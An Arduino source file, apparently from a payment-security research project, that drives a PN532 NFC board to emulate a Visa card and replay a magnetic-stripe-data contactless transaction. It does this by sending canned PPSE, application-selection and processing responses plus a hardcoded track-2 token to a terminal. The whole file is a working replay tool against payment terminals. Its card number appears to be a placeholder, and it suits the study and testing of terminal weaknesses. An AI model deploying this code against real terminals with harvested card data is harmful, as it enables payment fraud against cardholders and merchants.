/**
 * Example to replay a Visa MSD transaction by NFC 
 * using a static value.
 * 
 * Authors: 
 *        Salvador Mendoza - @Netxing - salmg.net
 *        For Electronic Cats - electroniccats.com
 * 
 *  April 2020
 * 
 * This code is beerware; if you see me (or any other collaborator 
 * member) at the local, and you've found our code helpful, 
 * please buy us a round!
 * Distributed as-is; no warranty is given.
 */

#include <Wire.h>
#include <SPI.h>
#include <Adafruit_PN532.h>

#define PN532_SCK  (17)
#define PN532_MOSI (16)
#define PN532_SS   (18)
#define PN532_MISO (19)

#define L1         (14) //LED1 indicates activity
#define L2         (5)  //LED2 indicates the emulation process 
#define L3         (4)  

#define NPIN       (27) //NFC Button
#define NFCT       (3)  //How many tries to emulate the token card

Adafruit_PN532 nfc(PN532_SCK, PN532_MISO, PN532_MOSI, PN532_SS);

// Token = data to be use it as track 2
// 4412345605781234 = card number in this case
const char token[19] = {0x44,0x12,0x34,0x56,0x05,0x78,0x12,0x34,0xd1,0x71,0x12,0x01,0x00,0x00,0x03,0x00,0x00,0x99,0x1f};

void setup(){
  pinMode(L1, OUTPUT);
  pinMode(L2, OUTPUT);
  pinMode(L3, OUTPUT);
  pinMode(NPIN, INPUT_PULLUP);

  Serial.begin(115200);
  //while(!Serial){}
  Serial.println("Hello!");

  nfc.begin();

  uint32_t versiondata = nfc.getFirmwareVersion();
  if (! versiondata) {
    Serial.print("Didn't find PN53x board");
    while (1); // halt
  }

  // blink to show we started up
  blink(L1, 200, 2);
  blink(L2, 200, 2);
  blink(L3, 200, 2);
  
  // Got ok data, print it out!
  Serial.print("Found chip PN5"); Serial.println((versiondata>>24) & 0xFF, HEX); 
  Serial.print("Firmware ver. "); Serial.print((versiondata>>16) & 0xFF, DEC); 
  Serial.print('.'); Serial.println((versiondata>>8) & 0xFF, DEC);
  
  nfc.setPassiveActivationRetries(0xFF);
  
  // configure board to read RFID tags
  nfc.SAMConfig();

}

void blink(int pin, int msdelay, int times){
  for (int i = 0; i < times; i++){
    digitalWrite(pin, HIGH);
    delay(msdelay);
    digitalWrite(pin, LOW);
    delay(msdelay);
  }
}

void runTarget(){ //Target emulation mode using a pre-saved token
  bool success;
  uint8_t apdubuffer[255]= {}, apdulen;
  uint8_t ppsea[] = {0x8E,0x6F,0x23,0x84,0x0E,0x32,0x50,0x41,0x59,0x2E,0x53,0x59,0x53,0x2E,0x44,0x44,0x46,0x30,0x31,0xA5,0x11,0xBF,0x0C,0x0E,0x61,0x0C,0x4F,0x07,0xA0,0x00,0x00,0x00,0x03,0x10,0x10,0x87,0x01,0x01,0x90,0x00};
  uint8_t visaa[] = {0x8E,0x6F,0x1E,0x84,0x07,0xA0,0x00,0x00,0x00,0x03,0x10,0x10,0xA5,0x13,0x50,0x0B,0x56,0x49,0x53,0x41,0x20,0x43,0x52,0x45,0x44,0x49,0x54,0x9F,0x38,0x03,0x9F,0x66,0x02,0x90,0x00};
  uint8_t processinga[] = {0x8E,0x80,0x06,0x00,0x80,0x08,0x01,0x01,0x00,0x90,0x00};
  uint8_t last [5] =  {0x8E,0x70,0x15,0x57,0x13};
  uint8_t card[26]={};
  
  uint8_t statusapdu[2] = {0x90,0x00};
  uint8_t finished[] = {0x8E,0x6f,0x00};
  
  memcpy(&card[0], last, sizeof(last));
  memcpy(&card[5], token, sizeof(token));
  memcpy(&card[24], statusapdu, sizeof(statusapdu));
  
  uint8_t *apdus[] = {ppsea, visaa, processinga, card, finished, finished}; 
  uint8_t apdusLen [] = {sizeof(ppsea), sizeof(visaa), sizeof(processinga), sizeof(card), sizeof(finished), sizeof(finished)};
  
  nfc.AsTarget();
  success = nfc.getDataTarget(apdubuffer, &apdulen);
  if (apdulen){
    for (uint8_t i = 0; i < 6; i++){
      nfc.setDataTarget(apdus[i], apdusLen[i]);
      nfc.getDataTarget(apdubuffer, &apdulen);
    }
    Serial.println("Emulated!");
  }
  else
    Serial.println("Error: could not find NFC reader");
  delay(1000);  
}

void nfcbutton(){ // Activate NFC reading or emulate card from a previous reading
  if (digitalRead(NPIN) == 0){
    blink(L2, 150, 1);
    Serial.println("Activating NFC...");      
    uint8_t timesNFC = 0;
    while(timesNFC < NFCT){
      blink(L2, 150, 1);
      runTarget();
      blink(L2, 150, 1);
      delay(2000);
      timesNFC += 1;
    }
    
    blink(L1, 100, 3);
    delay(400);
  }
}

void loop(){ // Main loop
  nfcbutton();
}
